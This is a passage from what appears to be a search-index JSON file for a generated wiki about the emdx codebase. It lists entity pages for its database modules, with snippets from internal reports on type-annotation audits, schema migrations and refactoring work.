\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>get_oldest_at_stage()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>save_document_to_cascade()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>list_deleted_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>list[cascaderunexecution]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>list[cascaderun]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>list[cascadedocumentlistitem]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>get_cascade_stats()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/emdxdatabasedocumentspy/","title":"emdx/database/documents.py","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2026-01-13</p>"},{"location":"entities/emdxdatabasedocumentspy/#documents-15","title":"Documents (15)","text":"<ul> <li>#6844 Delegate: ARCH-9 (Issue #1240): Filter emdx find by doc_type. Default  [1/2] <p>...r (default <code>\"user\"</code>) to <code>search_documents()</code> with SQL WHERE clause filtering</p> </li> <li><code>emdx/database/documents.py</code> \u2014 Added <code>doc_type</code> parameter to <code>list_documents()</code> and <code>get_recent_documents()</code></li> <li> <p><code>emdx/commands/core.py</code> \u2014 Added <code>--wiki</code> and <code>--all-types</code> CLI flags to `fi...</p> </li> <li> <p>#6557 Delegate: Document #6544 (Delegate Enhancement Gameplans [4/5]):</p> </li> </ul>"},{"location":"entities/emdxdatabasedocumentspy/#im","title":"Im","text":"<p>Section: Files Modified</p> <ol> <li><code>emdx/database/documents.py</code> - Added:</li> <li><code>get_docs_in_window(hours)</code>: Documents created in window</li> </ol> <ul> <li>#6505 None Type Analysis [3/7] </li> </ul> <p>Analysis of <code>| None</code> type annotations in emdx database module files to identify which are NECESSARY (nullable SQL columns) vs UNNECESSARY (always populated by defaults or application logic). ## Summary</p> <p>|...</p> <ul> <li>#6500 None Type Analysis [3/7]   Section: Files Analyzed <ol> <li><code>emdx/database/documents.py</code></li> </ol> </li> <li><code>emdx/database/__init__.py</code></li> <li><code>emdx/database/groups.py</code></li> <li><code>emdx/database/cascade.py</code></li> <li><code>emdx/database/search.py</code></li> <li><code>emdx/database/migrations.py</code></li> <li> <p><code>emdx/database/connection.py</code></p> </li> <li> <p>#6480 Delegate: List the top 5 most important files in the emdx project and    Section: Top 5 Most Important Files in the EMDX Project</p> </li> <li> <p>#6427 Add DocumentRow TypedDicts to database layer   Section: Add DocumentRow TypedDicts to database layer</p> <p>...s Changed</p> </li> <li>Created <code>emdx/database/types.py</code> with TypedDict definitions</li> <li>Updated <code>emdx/database/documents.py</code> with typed return annotations</li> <li>Updated <code>emdx/database/search.py</code> with typed return annotations</li> <li> <p>Updated <code>emdx/database/__init__.py</code> with typed return annotations</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Scope of Changes</p> <p>...----------|----------| | <code>emdx/models/tasks.py</code> | 13 functions | Critical | | <code>emdx/database/documents.py</code> | 12 functions | High | | <code>emdx/database/cascade.py</code> | 7 functions | High | | <code>emdx/database/groups.py</code> | 8 functions | Medium | | `emdx/models/categories.p...</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...Task #620: Atomic Transaction for save_document()</p> </li> <li>Modified <code>save_document()</code> in <code>emdx/database/documents.py</code> to pass existing connection to <code>add_tags_to_document()</code></li> <li>Document + tags now inserted in single atomic transaction</li> <li> <p>Moved <code>conn.commit()</code> after tagging to ensure...</p> </li> <li> <p>#6232 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: HIGH Severity - Could use TypedDict or more specific types</p> <p>...mdx/database/cascade.py:33<code>|</code>get_cascade_metadata<code>returns</code>dict[str, Any]<code>| |</code>emdx/database/documents.py:52<code>|</code>get_document<code>returns</code>Optional[dict[str, Any]]<code>| |</code>emdx/ui/command_palette/palette_presenter.py:37<code>|</code>data: Dict[str, Any]<code>on dataclass | |</code>emdx/ui/casc...</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: High Severity Issues (12)</p> <p>...Any] | None`</p> </li> <li><code>emdx/services/embedding_service.py</code> uses <code>Optional[np.ndarray]</code></li> <li> <p><code>emdx/database/documents.py:52</code> uses <code>Optional[dict[str, Any]]</code> Severity: HIGH</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 5. list_non_workflow_documents \u2014 DEAD CODE (4 hits)</p> <p>File: <code>emdx/database/documents.py</code></p> </li> <li> <p>#6165 Delegate: Audit emdx/models/ and emdx/database/ for dead code. Check:  [3/17]   Section: Called but return no-ops:</p> <p>...lers | |----------|-----------|--------|---------| | <code>record_document_source()</code> | <code>emdx/database/documents.py:669</code> | No-op, returns False | Exported via <code>emdx/services/document_service.py:13</code> - needs usage check | | <code>get_document_source()</code> | `emdx/database/documents.py:6...</p> </li> <li> <p>#6156 Delegate: Check if the document source no-op functions (record_documen [1/5]   Section: Document Source No-op Functions Analysis</p> <p>All defined in: <code>emdx/database/documents.py</code> (lines 669-687)</p> </li> <li> <p>#4746 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Theme 1: N+1 Database Query Pattern (Universal - CRITICAL)</p> <p>Root Cause: Missing batch query functions in <code>emdx/workflows/database.py</code> and <code>emdx/database/documents.py</code>.</p> </li> </ul>"},{"location":"entities/emdxdatabasedocumentspy/#none-type-analysis-database-module-37","title":"None Type Analysis \u2014 Database Module (3/7)","text":""},{"location":"entities/emdxdatabasedocumentspy/#2-emdxdatabasedocumentspy","title":"2. <code>emdx/database/documents.py</code>","text":"<p>The core CRUD operations module that handles all document persistence including saving, retrieving, listing, updating, soft-deleting, and searching documents in the SQLite knowledge base.</p>"},{"location":"entities/emdxdatabasedocumentspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/database/search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.8)</li> <li><code>emdx/database/documents.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>~1.75 hours</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>wrapup()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>workflow_run_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>type safety debt audit - emdx project</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>raw json output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>quiet mode (just summary)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>preview what would be summarized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>optional[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/emdxdatabasegroupspy/","title":"emdx/database/groups.py","text":"<p>Type: heading | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxdatabasegroupspy/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...| 2 | TaskDict fields | | <code>emdx/models/executions.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/database/groups.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/utils/output.py</code> | 1 | 0 | JSON serialization (keep) | | <code>emdx/utils/retry.py</code> | 8 | 0 | Generic decorator (keep) | | Total |...</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: Files with intentional <code>Any</code> usage (unchanged)</p> <p>...cutions.py<code>**:</code>update_execution(exec_id: int, **kwargs: Any)` - same pattern</p> </li> <li><code>emdx/database/groups.py</code>: <code>update_group(group_id: int, **kwargs: Any)</code> - same pattern</li> <li> <p><code>emdx/commands/review.py</code>: <code>_output_json(data: Any)</code> - JSON serialization accepts any serializa...</p> </li> <li> <p>#6505 None Type Analysis [3/7]</p> </li> </ul>"},{"location":"entities/emdxdatabasegroupspy/#file-emdxdatabase__init__py","title":"File: <code>emdx/database/__init__.py</code>","text":""},{"location":"entities/emdxdatabasegroupspy/#class-sqlitedatabase-method-parameters","title":"Class <code>SQLiteDatabase</code> Method Parameters","text":"Location Current Signature Verdict Reasoning <code>__init__()</code> L61 <code>db_path: Path \\| None = None</code>... <ul> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...rgs + dict pattern | | <code>emdx/models/executions.py</code> | 1 | 1 | kwargs pattern | | <code>emdx/database/groups.py</code> | 2 | 2 | kwargs pattern | | <code>emdx/utils/output.py</code> | 1 | 1 | JSON serialization | | <code>emdx/utils/retry.py</code> | 8 | 4-6 | Decorator + generic callable |</p> </li> <li> <p>#6500 None Type Analysis [3/7]   Section: Files Analyzed</p> <ol> <li><code>emdx/database/documents.py</code></li> </ol> </li> <li><code>emdx/database/__init__.py</code></li> <li><code>emdx/database/groups.py</code></li> <li><code>emdx/database/cascade.py</code></li> <li><code>emdx/database/search.py</code></li> <li><code>emdx/database/migrations.py</code></li> <li> <p><code>emdx/database/connection.py</code></p> </li> <li> <p>#6430 Add group TypedDicts to database and service layers   Section: Changes</p> <ol> <li>Updated <code>emdx/database/groups.py</code> return type annotations:</li> </ol> </li> <li><code>get_group()</code> -&gt; <code>DocumentGroup | None</code></li> <li><code>list_groups()</code> -&gt; <code>list[DocumentGroup]</code></li> <li> <p><code>get_group_members()</code> -&gt; `list[GroupMembe...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Scope of Changes</p> <p>...functions | High | | <code>emdx/database/cascade.py</code> | 7 functions | High | | <code>emdx/database/groups.py</code> | 8 functions | Medium | | <code>emdx/models/categories.py</code> | 2 functions | Medium | | <code>emdx/models/tags.py</code> | 2 functions | Medium | | <code>emdx/database/search.py</code> | 1 fun...</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 4. Added Security Documentation (MEDIUM severity)</p> <p>File: <code>emdx/database/groups.py</code></p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> </li> <li><code>emdx/models/executions.py</code> - Model sync and query refactor</li> <li><code>emdx/database/migrations.py</code> - Migrations 037, 038, and validator</li> <li> <p><code>emdx/database/groups.py</code> - Security documentation</p> </li> <li> <p>#6232 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Python Style Inconsistency: <code>Optional[T]</code> vs <code>T | None</code></p> <p>...[str] | None<code>| |</code>emdx/database/cascade.py<code>| Uses</code>T | None<code>consistently | |</code>emdx/database/groups.py<code>| Uses</code>T | None<code>consistently | |</code>emdx/services/unified_executor.py<code>| Uses</code>Optional[T]<code>exclusively | |</code>emdx/services/similarity.py<code>| Uses</code>Optional[T]` excl...</p> </li> </ul>"},{"location":"entities/emdxdatabasegroupspy/#files-modified","title":"Files Modified","text":""},{"location":"entities/emdxdatabasegroupspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>update_task(task_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>update_group(group_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>update_execution(exec_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>print_json(data: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>migration/schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>keep any</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>json.dumps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>list_groups()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>get_group()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/emdxdatabasemigrationspy/","title":"emdx/database/migrations.py","text":"<p>Type: tech_term | Mentioned in: 28 documents | First seen: 2026-01-10</p>"},{"location":"entities/emdxdatabasemigrationspy/#documents-28","title":"Documents (28)","text":"<ul> <li> <p>#6861 Delegate: FEAT-33 (Issue #1245): Add editorial prompt injection for wi [3/4]   Section: Changes made:</p> <ol> <li>Migration 051 (<code>emdx/database/migrations.py</code>): Added <code>editorial_prompt TEXT</code> column to <code>wiki_topics</code> table.</li> </ol> </li> <li> <p>#6860 Delegate: FEAT-34 (Issue #1246): Add per-topic model override for wiki [4/4]   Section: Changes made:</p> <ol> <li>Migration 051 (<code>emdx/database/migrations.py</code>): Added <code>model_override TEXT</code> column to <code>wiki_topics</code> table</li> </ol> </li> <li> <p>#6856 Delegate: FEAT-40 (Issue #1252): Add wiki quality ratings. Add rating  [4/4]   Section: Changes made:</p> <p><code>emdx/database/migrations.py</code> \u2014 Added migrations 048 and 050:</p> </li> <li><code>migration_048_add_wiki_article_rating</code>: Adds <code>rating INTEGER</code> and <code>rated_at TIMESTAMP</code> columns to <code>wiki_articles</code></li> <li> <p>`migration_...</p> </li> <li> <p>#6855 Delegate: FEAT-38 (Issue #1250): Add step-level timing to wiki_article [2/4]   Section: Changes made:</p> <ol> <li>Migration 048 (<code>emdx/database/migrations.py</code>): Adds 6 timing columns to <code>wiki_articles</code>: <code>prepare_ms</code>, <code>route_ms</code>, <code>outline_ms</code>, <code>write_ms</code>, <code>validate_ms</code>, <code>save_ms</code> \u2014 all <code>INTEGER DEFAULT 0</code>.</li> </ol> </li> <li> <p>#6851 Delegate: FEAT-39 (Issue #1251): Add article diff on regeneration. Whe [3/4]   Section: Changes made:</p> <ol> <li>Migration 048 (<code>emdx/database/migrations.py</code>): Adds <code>previous_content TEXT DEFAULT ''</code> column to <code>wiki_articles</code> table</li> </ol> </li> <li> <p>#6824 Delegate: Document #6822 (Wiki System Architecture Analysis &amp; Roadmap) [2/2]   Section: Summary</p> <ol> <li><code>emdx/database/migrations.py</code> \u2014 Added migration 046 creating <code>wiki_runs</code> table with columns: id, started_at, completed_at, topics_attempted, articles_generated, articles_skipped, total_input_t...</li> </ol> </li> <li> <p>#6616 Delegate: Remove the emoji alias system from emdx. This is a big-bang    Section: Changes Made</p> <p>...Phase 1: Database Migration</p> </li> <li>Added <code>migration_042_convert_emoji_tags_to_text</code> to <code>emdx/database/migrations.py</code></li> <li>Hardcoded emoji\u2192text reverse map (20 mappings including <code>\ud83d\udfe2\u2192active</code> anomaly)</li> <li> <p>Migration handles: emoji-only tags (rename), both emoji+text exist (merge document_t...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 Tag System Emojis (from EMOJI_ALIASES)</p> <p>...pe.py<code>| 3, 48, 65-66 | \ud83d\udccb | Recipe tag literal used to search for recipe docs | |</code>emdx/database/migrations.py<code>| 981 | \ud83d\udd27\ud83d\udc1b |</code>tag_to_label<code>JSON in export preset | |</code>emdx/database/migrations.py<code>| 1035 | \ud83d\udea7\ud83d\udea8\ud83d\udc1b |</code>strip_tags<code>in blog export preset | |</code>emdx/database/migrations....</p> </li> <li> <p>#6505 None Type Analysis [3/7]</p> </li> </ul>"},{"location":"entities/emdxdatabasemigrationspy/#file-emdxdatabasesearchpy","title":"File: <code>emdx/database/search.py</code>","text":""},{"location":"entities/emdxdatabasemigrationspy/#function-parameters-with-none","title":"Function Parameters with <code>| None</code>","text":"Location Current Signature Verdict Reasoning <code>search_documents()</code> L43 <code>project: str \\| None = None</code> ... <ul> <li>#6500 None Type Analysis [3/7]   Section: Files Analyzed <ol> <li><code>emdx/database/documents.py</code></li> </ol> </li> <li><code>emdx/database/__init__.py</code></li> <li><code>emdx/database/groups.py</code></li> <li><code>emdx/database/cascade.py</code></li> <li><code>emdx/database/search.py</code></li> <li><code>emdx/database/migrations.py</code></li> <li> <p><code>emdx/database/connection.py</code></p> </li> <li> <p>#6390 Fix migration rollback handling (Task #621)   Section: Fix Migration Rollback Handling (Task #621)</p> </li> <li> <p>#6363 Delegate: DEBT-15: Split the oversized emdx/database/migrations.py int [2/2]   Section: Summary</p> <p>Successfully split the oversized <code>emdx/database/migrations.py</code> (2200+ lines) into a focused package structure with 8 domain-specific modules.</p> </li> <li> <p>#6352 Delegate: Rebase the feat/auto-linking branch onto main and resolve al [3/5]   Section: Actions Taken</p> <ol> <li>Rebased onto origin/main</li> </ol> </li> <li> <p>Conflict detected in <code>emdx/database/migrations.py</code></p> </li> <li> <p>Resolved merge conflict</p> </li> <li> <p>Conflict: Both branches added migration #36 with different purposes</p> <ul> <li>main: migration_036_add_execution_metrics, mi...</li> </ul> </li> <li> <p>#6344 Delegate: R3: Split the oversized emdx/database/migrations.py (2200 li   Section: Summary</p> <p>Successfully split the oversized <code>emdx/database/migrations.py</code> (2200 lines) into a Python package with organized modules:</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 3. Migration File Organization</p> </li> <li> <p>#6295 Delegate: DEBT-25: Add COLLATE NOCASE index for FTS search   Section: DEBT-25: Add COLLATE NOCASE Indexes for Case-Insensitive Search</p> </li> <li> <p><code>emdx/database/migrations.py</code>: Added migration_037_add_collate_nocase_indexes</p> </li> <li> <p>#6291 DEBT-24: Fix PRAGMA foreign_keys handling   Section: DEBT-24: Fix PRAGMA foreign_keys handling</p> </li> <li> <p>#6278 Delegate: DEBT-9: Fix migration debt. Create new migration files (foll   Section: DEBT-9: Fix Migration Debt</p> </li> <li> <p><code>emdx/database/migrations.py</code>: Added migrations 037 and 038</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: 2. Added SQL Column Name Validation (MEDIUM)</p> <p>File: <code>emdx/database/migrations.py</code></p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> </li> <li><code>emdx/models/executions.py</code> - Model sync and query refactor</li> <li><code>emdx/database/migrations.py</code> - Migrations 037, 038, and validator</li> <li> <p><code>emdx/database/groups.py</code> - Security documentation</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udfe0 High Priority Issues</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Key Files</p> <p>...| CLI interface | | <code>emdx/commands/delegate.py</code> | Primary delegation command | | <code>emdx/database/migrations.py</code> | Schema definitions (009, 010, 034, 035) |</p> </li> <li> <p>#6165 Delegate: Audit emdx/models/ and emdx/database/ for dead code. Check:  [3/17]   Section: 4. Stale execution_type Constraint</p> File:Line Issue <code>emdx/database/migrations.py:1872</code> <code>execution_type IN ('workflow', 'direct', 'manual')</code> still includes 'workflow' <code>emdx/models/task_executions.py:156</code> Counts `execution_type = 'workflow'... </li> <li> <p>#6143 Delegate: Read gameplan by running: emdx view 6098. Implement the Auto [2/7]   Section: CLI Commands</p> </li> <li><code>emdx/database/migrations.py</code> \u2014 Added migration_036</li> <li><code>emdx/services/linking_service.py</code> \u2014 New file (350 lines)</li> <li><code>emdx/commands/core.py</code> \u2014 Added --auto-link flag, view links display</li> <li> <p>`emdx/com...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Print Statements in Production Code</p> File Line Should Be <code>emdx/ui/log_parser.py</code> 121 <code>logger.error()</code> <code>emdx/database/migrations.py</code> 1113-1116 <code>logger.info()</code> <code>emdx/ui/nvim_wrapper.py</code> 241 <code>logger.error()</code> </li> <li> <p>#6429 Delegate: Task #359: Fix Semantic Find CI failures. The branch feat/se [2/2]   Section: Key Changes</p> <p>...Kept hybrid search code from feat/semantic-find, resolved conflicts with main</p> </li> <li>emdx/database/migrations.py: Renumbered chunk_embeddings to migration 40 (main used 39 for categories)</li> </ul>"},{"location":"entities/emdxdatabasemigrationspy/#problem","title":"Problem","text":"<p>In <code>emdx/database/migrations.py</code> <code>run_migrations()</code> (lines 2217-2240), two issues existed:</p>"},{"location":"entities/emdxdatabasemigrationspy/#critical-single-2100-line-file","title":"Critical: Single 2100+ Line File","text":"<p>File: <code>emdx/database/migrations.py</code> (2100+ lines, 39 migrations)</p>"},{"location":"entities/emdxdatabasemigrationspy/#files-changed","title":"Files Changed","text":""},{"location":"entities/emdxdatabasemigrationspy/#summary","title":"Summary","text":"<p>Consolidated PRAGMA foreign_keys handling by introducing a <code>foreign_keys_disabled()</code> context manager in <code>emdx/database/migrations.py</code>.</p>"},{"location":"entities/emdxdatabasemigrationspy/#files-changed_1","title":"Files Changed","text":""},{"location":"entities/emdxdatabasemigrationspy/#files-modified","title":"Files Modified","text":""},{"location":"entities/emdxdatabasemigrationspy/#4-large-migration-file-2021-lines","title":"4. Large Migration File (2021 lines)","text":"<p>Location: <code>emdx/database/migrations.py</code> Impact: Difficult to maintain, test, and debug</p>"},{"location":"entities/emdxdatabasemigrationspy/#files-changed_2","title":"Files Changed","text":""},{"location":"entities/emdxdatabasemigrationspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/database/migrations.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>\ud83d\udfe2\u2192active</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>wiki topics</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>runtimeerror</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>remove emoji alias system from emdx</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>remove emoji alias system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>phase 5: test updates</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>phase 4: display/formatting</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>phase 3: consumer updates</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/emdxdatabasetypespy/","title":"emdx/database/types.py","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/emdxdatabasetypespy/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6855 Delegate: FEAT-38 (Issue #1250): Add step-level timing to wiki_article [2/4]   Section: Changes made:</p> <ol> <li>WikiArticleTimingDict (<code>emdx/database/types.py</code>): New TypedDict with the 6 timing fields.</li> </ol> </li> <li> <p>#6824 Delegate: Document #6822 (Wiki System Architecture Analysis &amp; Roadmap) [2/2]   Section: Summary</p> <ol> <li><code>emdx/database/types.py</code> \u2014 Added <code>WikiRunRow</code> TypedDict for type-safe wiki run rows</li> </ol> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 4. No changes needed for <code>stage_summary_bar.py</code> and <code>document_list.py</code></p> <p>These files only use <code>Any</code> for <code>**kwargs: Any</code> which is a standard pattern for Textual widget initialization. <code>document_list.py</code> already uses <code>CascadeDocumentListItem</code> TypedDict from <code>emdx/database/types.py</code>.</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Recommended Shared Type Locations</p> <p>....py<code>(existing) |</code>TagCountDict<code>,</code>TaskUpdateKwargs<code>,</code>ExecutionUpdateKwargs<code>| |</code>emdx/database/types.py<code>(new or existing) |</code>GroupUpdateKwargs<code>,</code>CompactDocumentRow` |</p> </li> <li> <p>#6505 None Type Analysis [3/7]</p> </li> </ul>"},{"location":"entities/emdxdatabasetypespy/#file-emdxdatabaseconnectionpy","title":"File: <code>emdx/database/connection.py</code>","text":""},{"location":"entities/emdxdatabasetypespy/#function-parameters-with-none","title":"Function Parameters with <code>| None</code>","text":"Location Current Signature Verdict Reasoning <code>DatabaseConnection.__init__()</code> L33 `db_path: Path ... <ul> <li>#6431 Add cascade TypedDicts to database and service layers   Section: Changes Made <p>New file: <code>emdx/database/types.py</code></p> </li> <li><code>CascadeMetadata</code> - Cascade metadata for a document</li> <li><code>CascadeDocumentListItem</code> - Document item in cascade stage listings</li> <li> <p><code>CascadeRun</code> - Cascade run record -...</p> </li> <li> <p>#6430 Add group TypedDicts to database and service layers   Section: Changes</p> <ol> <li>Created <code>emdx/database/types.py</code> with 4 TypedDicts:</li> </ol> </li> <li><code>DocumentGroup</code> - Base group type from document_groups table</li> <li> <p><code>DocumentGroupWithCounts</code> - Extends DocumentGroup with child_group_count...</p> </li> <li> <p>#6427 Add DocumentRow TypedDicts to database layer   Section: Add DocumentRow TypedDicts to database layer</p> </li> <li>Created <code>emdx/database/types.py</code> with TypedDict definitions</li> <li>Updated <code>emdx/database/documents.py</code> with typed return annotations</li> <li> <p>Updated <code>emdx/database/search.py</code> with typed return annotations -...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Actionable Items</p> <ol> <li>Create <code>emdx/database/types.py</code> with all database TypedDicts</li> </ol> </li> <li>Create <code>emdx/models/types.py</code> with all model TypedDicts</li> <li>Start with TaskDict \u2014 highest ROI, used everywhere</li> <li>**Use `fr...</li> </ul>"},{"location":"entities/emdxdatabasetypespy/#files-changed","title":"Files Changed","text":""},{"location":"entities/emdxdatabasetypespy/#related-entities","title":"Related 